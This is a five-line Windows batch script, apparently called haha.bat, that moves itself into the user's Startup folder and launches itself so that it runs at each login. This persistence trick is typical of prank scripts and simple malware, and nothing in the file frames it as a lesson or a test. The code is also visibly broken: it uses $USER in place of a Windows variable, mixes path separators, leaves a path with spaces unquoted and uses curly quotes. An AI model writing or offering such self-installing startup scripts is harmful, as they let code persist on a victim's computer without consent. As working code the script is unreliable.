@echo off
echo "$USER"
move haha.bat C:\Users/$USER\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
cd “C:\Users\$USER\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup”
start haha.bat